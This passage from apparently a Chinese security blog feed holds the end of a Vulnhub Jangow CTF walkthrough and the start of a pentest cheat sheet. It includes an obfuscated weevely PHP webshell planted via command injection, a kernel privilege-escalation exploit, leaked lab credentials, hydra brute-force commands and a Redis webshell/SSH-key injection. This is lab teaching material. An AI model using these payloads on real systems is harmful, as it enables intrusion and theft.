class="line">eyRqfUw7fX1yZUx0dXJMbiAkbzt9aWYgTChAcHJlZ19MbUxMYSc7CiRkPXN0cl9yZXBsYWNlKCdT</span><br><span class="line">eicsJycsJ1N6Y3JlYXRTemVfU3pTemZTenVuU3pjdGlvbicpOwokWD0nbUxbTDFdKSwkaykpKTsk</span><br><span class="line">TG89QG9MYl9nTGV0X2NvbnRMZW50THMoKTtAb2JfZW5MZF9jbGVMYW4oKTtMJHJMPUAnOwokdz0n</span><br><span class="line">RVZsNUx0dTJjNExKYXdDdXZrTEwiO2Z1bmN0aW9MbiB4KCR0LExMJGspeyRjPXN0ckxsTGVuKCRr</span><br><span class="line">KTskbD1zdCc7CiRmPXN0cl9yZXBsYWNlKCdMJywnJywkei4kdy4kcS4kdC4kQS4kVC4kWC4kbCk7</span><br><span class="line">CiRVPSRkKCcnLCRmKTskVSgpOwo/Pgo=</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.56.118/site/bfl.php&#x27;</span> --data <span class="string">&quot;BFL=system(&#x27;echo -n PD9waHAKJHo9JyRrPSI1TGJMMmNMMjhlTGMiOyRraD0iNDE1NmRiYUwwNTM1NyJMOyRrZj0iNzc3MmYxOEwyTDg1YWIiOyRwPSJMJzsKJGw9J2JhTHNlNjRfZW5jb2RlKEBMTHhMKExAZ3pjb21McHJMZXNzKCRvKSwkaykpO3ByaW50KCIkcCRraCRyJGtmIik7fSc7CiRBPSd0Y0xoKCIvJGtoKC4rKUwka0xmLyIsQGZpbGVfZ2V0X2NvbnRMZW50cygicExocDovTC9pbnB1dEwiKSwkbSk9JzsKJHE9J3JsZUxuKCRMdClMOyRvPSIiO2ZvcigkaUw9MDskaTwkbDtMTCl7Zm9Mcigkaj0wO0woJGo8JExjJiYkaTwkbCk7TCc7CiRUPSdMPTEpIEx7QG9MYl9zdGFydCgpTDtAZUx2YWwoQGd6dW5MY29tTHByZXNMcyhAeChAYkxhc2U2NExfZGVjb2RlKCQnOwokdD0nJGorTCssJGkrKyl7TCRvLj0kdEx7JGl9XiRreyRqfUw7fX1yZUx0dXJMbiAkbzt9aWYgTChAcHJlZ19MbUxMYSc7CiRkPXN0cl9yZXBsYWNlKCdTeicsJycsJ1N6Y3JlYXRTemVfU3pTemZTenVuU3pjdGlvbicpOwokWD0nbUxbTDFdKSwkaykpKTskTG89QG9MYl9nTGV0X2NvbnRMZW50THMoKTtAb2JfZW5MZF9jbGVMYW4oKTtMJHJMPUAnOwokdz0nRVZsNUx0dTJjNExKYXdDdXZrTEwiO2Z1bmN0aW9MbiB4KCR0LExMJGspeyRjPXN0ckxsTGVuKCRrKTskbD1zdCc7CiRmPXN0cl9yZXBsYWNlKCdMJywnJywkei4kdy4kcS4kdC4kQS4kVC4kWC4kbCk7CiRVPSRkKCcnLCRmKTskVSgpOwo/Pgo= | base64 -d &gt; BFL.php&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><p><code>weevely http://192.168.56.118/site/BFL.php Bufferfly</code></p><p>算是获取了个Shell吧</p><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><p><code>cat user.txt</code></p><p><strong><code>d41d8cd98f00b204e9800998ecf8427e</code></strong></p><p><code>cat /var/www/html/.backup</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="string">&quot;jangow01&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;jangow01&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;abygurl69&quot;</span>;</span><br><span class="line"><span class="comment">// Create connection</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Connected successfully&quot;</span>;</span><br><span class="line">mysqli_close(<span class="variable">$conn</span>);</span><br></pre></td></tr></table></figure><p><code>cat /var/www/html/site/wordpress/config.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="string">&quot;desafio02&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;desafio02&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;abygurl69&quot;</span>;</span><br><span class="line"><span class="comment">// Create connection</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Connected successfully&quot;</span>;</span><br><span class="line">mysqli_close(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>cat /etc/passwd | grep home</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syslog:x:104:108::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false</span><br><span class="line">jangow01:x:1000:1000:desafio02,,,:&#x2F;home&#x2F;jangow01:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>netstat里面看见了SSH，但是连不上，估计是配iptables了</p><p>在Virtualbox中登录（偷看WP的）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jangow01</span><br><span class="line">abygurl69</span><br></pre></td></tr></table></figure><p>逛一圈后没看见什么有价值的信息</p><p><code>uname -a</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux jangow01 4.4.0-31-generic <span class="comment">#50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.exploit-db.com/exploits/45010">https://www.exploit-db.com/exploits/45010</a></p></blockquote><p>文件保存到本地</p><p>编译</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp</span><br></pre></td></tr></table></figure><p>weevely中上传并赋权</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:file_upload ./exp /tmp/exp</span><br><span class="line">chmod +x /tmp/exp</span><br></pre></td></tr></table></figure><p>VirtualBox终端中jangow01用户运行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/exp</span><br></pre></td></tr></table></figure><p><code>cat /root/proof.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">                       @@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                          </span><br><span class="line">                       @  @@@@@@@@@@@@@@@&amp;#   #@@@@@@@@&amp;(.    &#x2F;&amp;@@@@@@@@@@                          </span><br><span class="line">                       @  @@@@@@@@@@&amp;( .@@@@@@@@&amp;%####((&#x2F;&#x2F;#&amp;@@@&amp;   .&amp;@@@@@                          </span><br><span class="line">                       @  @@@@@@@&amp;  @@@@@@&amp;@@@@@&amp;%######%&amp;@*   .&#x2F;@@*   &amp;@@                          </span><br><span class="line">                       @  @@@@@* (@@@@@@@@@#&#x2F;.               .*@.  .#&amp;.   &amp;@@@&amp;&amp;                    </span><br><span class="line">                       @  @@@, &#x2F;@@@@@@@@#,                       .@.  ,&amp;,   @@&amp;&amp;                    </span><br><span class="line">                       @  @&amp;  @@@@@@@@#.         @@@,@@@&#x2F;           %.  #,   %@&amp;                    </span><br><span class="line">                       @@@#  @@@@@@@@&#x2F;         .@@@@@@@@@@            *  .,    @@                   </span><br><span class="line">                       @@&amp;  @@@@@@@@*          @@@@@@@@@@@             ,        @                   </span><br><span class="line">                       @&amp;  .@@@@@@@(      @@@@@@@@@@@@@@@@@@@@@        *.       &amp;@                  </span><br><span class="line">                      @@&#x2F;  *@@@@@@@&#x2F;           @@@@@@@@@@@#                      @@                 </span><br><span class="line">                      @@   .@@@@@@@&#x2F;          @@@@@@@@@@@@@              @#      @@                 </span><br><span class="line">                      @@    @@@@@@@@.          @@@@@@@@@@@              @@(      @@                 </span><br><span class="line">                       @&amp;   .@@@@@@@@.         , @@@@@@@ *            .@@@*(    .@                  </span><br><span class="line">                       @@    ,@@@@@@@@,   @@@@@@@@@&amp;*%@@@@@@@@@,    @@@@@(%&amp;*   &amp;@                  </span><br><span class="line">                       @@&amp;     @@@@@@@@@@@@@@@@@         (@@@@@@@@@@@@@@%@@&#x2F;   &amp;@                   </span><br><span class="line">                       @ @&amp;     ,@@@@@@@@@@@@@@@,@@@@@@@&amp;%@@@@@@@@@@@@@@@%*   &amp;@                    </span><br><span class="line">                       @  @@.     .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*    &amp;@&amp;                    </span><br><span class="line">                       @  @@@&amp;       ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%&#x2F;     &amp;@@&amp;&amp;                    </span><br><span class="line">                       @  @@@@@@.        *%@@@@@@@@@@@@@@@@@@@@&amp;#&#x2F;.      &amp;@@@@&amp;&amp;                    </span><br><span class="line">                       @  @@@@@@@@&amp;               JANGOW               &amp;@@@                          </span><br><span class="line">                       @  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@&amp;     @@(&amp;@ @. %.@ @@%@     &amp;@@@&amp;&amp;&amp;&amp;                          </span><br><span class="line">                                     &amp;&amp;&amp;@@@@&amp;%       &amp;&#x2F;    (&amp;&amp;@@@&amp;&amp;&amp;                                </span><br><span class="line">                                       (((((((((((((((((((((((((((((</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">da39a3ee5e6b4b0d3255bfef95601890afd80709</span><br></pre></td></tr></table></figure><hr /><blockquote><p>网络问题</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">iptables -L</span><br><span class="line">...</span><br><span class="line">Chain ufw-user-forward (1 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line"></span><br><span class="line">Chain ufw-user-input (1 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ftp</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http</span><br><span class="line">ACCEPT     udp  --  anywhere             anywhere             udp dpt:http</span><br><span class="line"></span><br><span class="line">Chain ufw-user-limit (0 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">LOG        all  --  anywhere             anywhere             limit: avg 3&#x2F;min burst 5 LOG level warning prefix &quot;[UFW LIMIT BLOCK] &quot;</span><br><span class="line">REJECT     all  --  anywhere             anywhere             reject-with icmp-port-unreachable</span><br><span class="line"></span><br><span class="line">Chain ufw-user-limit-accept (0 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">ACCEPT     all  --  anywhere             anywhere            </span><br><span class="line"></span><br><span class="line">Chain ufw-user-logging-forward (0 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line"></span><br><span class="line">Chain ufw-user-logging-input (0 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line"></span><br><span class="line">Chain ufw-user-logging-output (0 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line"></span><br><span class="line">Chain ufw-user-output (1 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:https</span><br><span class="line">ACCEPT     udp  --  anywhere             anywhere             udp dpt:https</span><br></pre></td></tr></table></figure><p>配置iptable来Ban掉反弹Shell倒是第一次见，在这上面也确实浪费了一些时间</p><blockquote><p>有SSH不用非要用VirtualBox终端登录</p></blockquote><p>非常规，有点整活</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">localectl</span><br><span class="line">   System Locale: LANG&#x3D;pt_BR.UTF-8</span><br><span class="line">                  LANGUAGE&#x3D;pt_BR:pt:en</span><br><span class="line">                  LC_NUMERIC&#x3D;pt_BR</span><br><span class="line">                  LC_TIME&#x3D;pt_BR</span><br><span class="line">                  LC_MONETARY&#x3D;pt_BR</span><br><span class="line">                  LC_PAPER&#x3D;pt_BR</span><br><span class="line">                  LC_NAME&#x3D;pt_BR</span><br><span class="line">                  LC_ADDRESS&#x3D;pt_BR</span><br><span class="line">                  LC_TELEPHONE&#x3D;pt_BR</span><br><span class="line">                  LC_MEASUREMENT&#x3D;pt_BR</span><br><span class="line">                  LC_IDENTIFICATION&#x3D;pt_BR</span><br><span class="line">       VC Keymap: n&#x2F;a</span><br><span class="line">      X11 Layout: br</span><br><span class="line">       X11 Model: a4techKB21</span><br></pre></td></tr></table></figure><p>但是比上次的西语键盘好摁点</p><p>参考资料</p><blockquote><p><a href="https://resources.infosecinstitute.com/topic/jangow-1-0-1-ctf-walkthrough/">WP</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;Vulnhub年靶机数量&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:center&quot;&gt;Year&lt;/th&gt;
&lt;th style=&quot;text-align:center&quot;&gt;Num&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;…&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;…&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;2018&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;65&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;2019&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;117&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;2020&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;223&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;2021&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;108&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;2022&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;难免对于一个时代的落幕感到惋惜&lt;/p&gt;
&lt;p&gt;但同时庆幸自己能够在最好的时间参与其中&lt;/p&gt;
&lt;p&gt;在学习的过程中享受这个过程&lt;/p&gt;
&lt;p&gt;Thank you, Vulnhub &amp;amp; every author.&lt;/p&gt;
&lt;p&gt;Thank you for what I learned and every wonderful challenge I enjoyed.&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="Vulnhub" scheme="https://yoloyolo.top/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>靶机渗透手册</title>
    <link href="https://yoloyolo.top/2023/02/08/Drone-Pentest-Handbook/"/>
    <id>https://yoloyolo.top/2023/02/08/Drone-Pentest-Handbook/</id>
    <published>2023-02-08T03:15:20.000Z</published>
    <updated>2023-03-23T18:02:48.021Z</updated>
    
    <content type="html"><![CDATA[<p>迟来的文章</p><a id="more"></a><h1 id="靶机渗透手册"><a class="markdownIt-Anchor" href="#靶机渗透手册"></a> 靶机渗透手册</h1><p><code>2020/10/28 21:19:49</code></p><h2 id="情报收集"><a class="markdownIt-Anchor" href="#情报收集"></a> 情报收集</h2><h3 id="实际渗透"><a class="markdownIt-Anchor" href="#实际渗透"></a> 实际渗透</h3><ul><li><a href="https://www.freebuf.com/articles/database/195169.html">全流程信息收集方法总结</a></li><li><a href="https://www.freebuf.com/articles/web/204883.html">渗透测试信息收集心得分享</a></li></ul><h3 id="靶机渗透"><a class="markdownIt-Anchor" href="#靶机渗透"></a> 靶机渗透</h3><h4 id="查找ip"><a class="markdownIt-Anchor" href="#查找ip"></a> 查找IP</h4><ul><li>主办方给出(比赛)</li><li>netdiscover</li><li>路由器查看主机IP(需权限)</li><li>根据虚拟机IP分布，用浏览器逐个访问IP(仅限存在WEB服务，不推荐)</li><li><code>nmap -sn -T5 192.168.0.0/24 | grep -B2 -E &quot;(virtual|VMware)&quot;</code>(虚拟机的MAC地址)</li><li><code>arp-scan -l</code></li></ul><h4 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h4><p><code>nmap -p 1-65535 -sV -v -T5 -n 192.168.0.0</code></p><h4 id="web路径"><a class="markdownIt-Anchor" href="#web路径"></a> Web路径</h4><p><code>dirb http://192.168.0.0/ -w</code><br /><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php -u http://192.168.0.1/</code></p><h4 id="vhost"><a class="markdownIt-Anchor" href="#vhost"></a> VHOST</h4><p><code>wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &quot;http://flight.htb&quot; -H &quot;Host: FUZZ.flight.htb&quot; --hl 154</code></p><h4 id="smb信息枚举"><a class="markdownIt-Anchor" href="#smb信息枚举"></a> SMB信息枚举</h4><p><code>enum4linux 192.168.0.0</code></p><h2 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析"></a> 漏洞分析</h2><ul><li>SSH弱口令</li><li>FTP匿名登入</li><li>SMB弱口令</li><li>NFS目录挂载</li><li>Web服务框架</li><li>Web爆破</li><li>LDAP</li><li>Redis未授权</li><li>其他漏洞</li><li>searchsploit</li></ul><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><h3 id="ssh弱口令"><a class="markdownIt-Anchor" href="#ssh弱口令"></a> SSH弱口令</h3><p><code>hydra -V -I -f -t 64 -L user -P pass ssh://192.168.0.0:22</code></p><h3 id="ftp匿名登入"><a class="markdownIt-Anchor" href="#ftp匿名登入"></a> FTP匿名登入</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.0.1</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure><ul><li>获取敏感文件</li><li>FTP Banner</li></ul><h3 id="smb弱口令"><a class="markdownIt-Anchor" href="#smb弱口令"></a> SMB弱口令</h3><p><code>enum4limux 192.168.0.0</code><br /><code>hydra -L user -P pass -I -e n smb://192.168.0.0</code><br /><code>smbmap -H 192.168.0.0</code><br /><code>smbclient //192.168.0.0/dir -U username</code><br />使用<code>smbclient</code>登入时需要确保路径/用户名/口令都正确</p><h3 id="nfs目录挂载"><a class="markdownIt-Anchor" href="#nfs目录挂载"></a> NFS目录挂载</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nfs-common</span><br><span class="line">vim /etc/exports</span><br><span class="line">    /share1 *(sync,ro) 192.168.0.0(sync,rw)</span><br><span class="line">systemctl restart rpcbind</span><br><span class="line">systemctl restart nfs</span><br><span class="line">showmount -e 192.168.0.0</span><br><span class="line">    Export list for 192.168.0.0:</span><br><span class="line">    /home/peter *</span><br><span class="line">mkdir /mnt/share1</span><br><span class="line">mount -t nfs 192.168.0.0:/home/peter /mnt/share1</span><br><span class="line">cd /mnt/share1</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><h3 id="web框架"><a class="markdownIt-Anchor" href="#web框架"></a> Web框架</h3><ul><li>drupal : RCE(<a href="https://github.com/dreadlocked/Drupalgeddon2">https://github.com/dreadlocked/Drupalgeddon2</a>)</li><li>wordpress : wpscan – <a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a> | searchsploit<ul><li>wpscan --url <a href="http://192.168.0.0/">http://192.168.0.0/</a> -e ap --plugins-detection Aggressive</li><li>Appearance -&gt; Editor -&gt; 404.php: <code>/wp-content/twentyfourteen/404.php</code></li></ul></li><li>webmin : MSF(exploit/linux/http/webmin_packageup_rce)</li><li>robots.txt</li><li>struts2漏洞</li><li>flask SSTI</li></ul><h3 id="web爆破"><a class="markdownIt-Anchor" href="#web爆破"></a> Web爆破</h3><ul><li>Web页面内容生成字典 : <code>cewl http://192.168.31.39/websec -w pass</code></li><li>hydra-post-form : <code>hydra -I -l contact@hacknos.com -P FuzzDicts-master/passwordDict/top6000.txt -vV -f 192.168.31.39 http-post-form &quot;/websec/login:username=^USER^&amp;password=^PASS^:Wrong&quot;</code></li><li>JWT : <a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFhYSJ9.Xjc37g2j_pU5SFHYwoPSHWJDEmRVPtfHkbFfGPcn4W0</span><br><span class="line">pip install pyjwt</span><br><span class="line">python</span><br><span class="line">&gt;&gt;&gt; import jwt</span><br><span class="line">&gt;&gt;&gt; jwt.encode(&#123;&#39;username&#39;: &#39;admin&#39;&#125;, &#39;1Kun&#39;, algorithm&#x3D;&#39;HS256&#39;)</span><br><span class="line">&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo&#39;</span><br></pre></td></tr></table></figure><ul><li>HTTP-Basic认证<ul><li>配合Burp的Intruder模块</li><li>字典生成脚本</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">raw = [ </span><br><span class="line">        <span class="string">&#x27;Recon&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Web&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Service&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Blog&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;hackNos&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;TroubleShoot&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Security&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Recon Security&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Secure&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;5ecure&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Secure@hackNos&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Security@hackNos&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> raw:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> raw:</span><br><span class="line">            <span class="built_in">print</span> base64.b64encode(j + <span class="string">&#x27;:&#x27;</span> + i)</span><br></pre></td></tr></table></figure><h3 id="ldap"><a class="markdownIt-Anchor" href="#ldap"></a> LDAP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.0.0 -p 389 --script ldap-search --script-args &#39;ldap.username&#x3D;&quot;cn&#x3D;admin,dc&#x3D;admin,dc&#x3D;local&quot;,ldap.password&#x3D;password&#39;</span><br></pre></td></tr></table></figure><h3 id="redis未授权"><a class="markdownIt-Anchor" href="#redis未授权"></a> Redis未授权</h3><ul><li>php文件</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set webshell &quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><ul><li>SSH秘钥</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rm -rf ~/.ssh/id*</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat ~/.ssh/id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; new.txt</span><br><span class="line">redis-cli -h 192.168.0.0 flushall</span><br><span class="line">cat new.txt | redis-cli -h 1192.168.0.0 -x set crackit</span><br><span class="line">redis-cli -h 192.168.0.0 config set dir /var/lib/redis/.ssh/</span><br><span class="line">redis-cli -h 192.168.0.0 config set 